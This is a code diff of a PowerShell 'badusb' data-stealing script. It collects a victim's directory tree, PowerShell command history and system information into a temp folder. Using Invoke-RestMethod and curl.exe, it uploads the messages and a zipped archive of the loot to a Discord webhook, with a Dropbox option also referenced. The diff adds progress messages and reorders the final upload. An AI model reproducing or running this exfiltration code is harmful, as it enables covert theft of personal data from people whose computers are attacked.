@@ -31,8 +31,6 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
-
 ############################################################################################################################################################
 
 Upload-Discord -text "badusb started"
@@ -44,6 +42,9 @@ tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
 # Powershell history
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
+
+
+Upload-Discord -text "tree and powershell done"
 
 ############################################################################################################################################################
 
@@ -427,7 +428,11 @@ $drivers
 
 "@
 
+Upload-Discord -text "Collected all info"
+
 $output > $env:TEMP\$FolderName/computerData.txt
+
+Upload-Discord -text "Saved computer datat"
 
 ############################################################################################################################################################
 
@@ -496,6 +501,10 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
  
 
 ############################################################################################################################################################
+# Upload output file to Discord
+Upload-Discord -text "Sending data..."
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
+
 
 <#
 .NOTES 
